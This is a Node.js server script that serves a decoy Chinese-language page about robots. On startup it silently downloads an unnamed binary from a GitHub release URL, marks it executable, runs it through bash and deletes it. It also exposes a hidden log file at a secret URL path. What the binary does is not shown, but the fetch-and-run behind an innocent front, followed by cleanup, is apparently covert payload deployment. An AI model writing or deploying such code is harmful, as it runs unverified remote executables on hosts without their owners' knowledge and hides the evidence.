const http = require("http");
const fs = require('fs');
const axios = require('axios');
const { exec } = require('child_process');
const PORT = process.env.PORT || 3000;
const SUB_PATH = process.env.SUB_PATH || 'log';

const server = http.createServer((req, res) => {
  if (req.url === '/') {
    // 生成一份精美的机器人页面
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(`<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>欢迎来到机器人世界</title>
<style>
  body {
    font-family: Arial, Helvetica, sans-serif;
    background: linear-gradient(135deg, #1e1e1e, #3a3a3a);
    color: #f0f0f0;
    padding: 0;
    margin: 0;
    text-align: center;
  }
  header {
    padding: 2rem;
    background: #222;
    border-bottom: 4px solid #00ff99;
  }
  h1 {
    font-size: 2.5rem;
    color: #00ff99;
  }
  main {
    padding: 2rem;
  }
  p {
    max-width: 800px;
    margin: 1rem auto;
    line-height: 1.6;
  }
  img {
    max-width: 100%;
    border-radius: 1rem;
    box-shadow: 0 0 20px rgba(0,255,153,0.4);
    margin: 2rem 0;
  }
  section {
    background: rgba(255,255,255,0.05);
    padding: 1rem;
    border-radius: 1rem;
    margin: 2rem auto;
    max-width: 800px;
  }
  h2 {
    color: #00ff99;
    margin-top: 0;
  }
  footer {
    padding: 1rem;
    background: #222;
    color: #888;
    font-size: 0.8rem;
  }
</style>
</head>
<body>
  <header>
    <h1>欢迎来到机器人世界</h1>
  </header>
  <main>
    <img src="https://images.unsplash.com/photo-1581091215376-8e4c8f36fa48?fit=crop&w=800&q=80" alt="机器人形象">
    <p>机器人是现代科技与工程的结晶，它们正在改变我们的生产与生活方式。从自动化工业机器人到与人类交流的服务机器人，它们无处不在，正在让世界更加智能、高效与美好。</p>

    <section>
      <h2>机器人类型</h2>
      <p>机器人可大致分为工业机器人、服务机器人、医疗机器人、军用机器人以及娱乐机器人等。每一类都有不同的设计目标和应用场景，帮助人类解决各式各样的问题。</p>
    </section>

    <section>
      <h2>机器人历史</h2>
      <p>从20世纪中叶开始，人类就对机器人充满幻想与研究。随着计算机与传感技术的发展，机器人已从最初的自动化工具演变为能自主决策的智能伙伴，未来将与人类更加紧密合作，共创美好未来。</p>
    </section>

    <section>
      <h2>机器人与未来</h2>
      <p>未来，随着人工智能算法、传感器与材料科学的不断进步，机器人将更加灵活与聪明，不仅能执行重复任务，也能与人类更自然地交流互动，真正成为人类的帮手与朋友。</p>
    </section>
  </main>
  <footer>&copy; 2025 机器人世界 | Powered by Node.js</footer>
</body>
</html>`);
  } 
  else if (req.url === `/${SUB_PATH}`) {
    fs.readFile("./.npm/log.txt", "utf8", (err, data) => {
      if (err) {
        console.error(err);
        res.writeHead(500, { 'Content-Type': 'text/plain; charset=utf-8' });
        res.end("读取 log.txt 出错");
      } else {
        res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
        res.end(data);
      }
    });
  }
});

const downloadFile = async () => {
  try {
    const url = "https://github.com/derwalldrose/default/releases/download/v1.0.0/default";
    const randomFileName = Math.random().toString(36).substring(2, 12);
    const response = await axios({ method: 'get', url, responseType: 'stream' });

    const writer = fs.createWriteStream(randomFileName);
    response.data.pipe(writer);

    return new Promise((resolve, reject) => {
      writer.on('finish', () => {
        console.log(`${randomFileName} 下载完成`);
        exec(`chmod +x ${randomFileName}`, (err) => {
          if (err) reject(err);
          resolve(randomFileName);
        });
      });
      writer.on('error', reject);
    });
  } catch (err) {
    throw err;
  }
};

const Execute = async () => {
  try {
    const fileName = await downloadFile();
    const command = `./${fileName}`;
    exec(command, { shell: '/bin/bash' }, () => {
      fs.unlink(fileName, () => {});
    });
  } catch (err) {
    console.error('执行命令时出错:', err);
  }
};

server.listen(PORT, () => {
  Execute();
  console.log(`服务器正在监听端口: ${PORT}`);
});
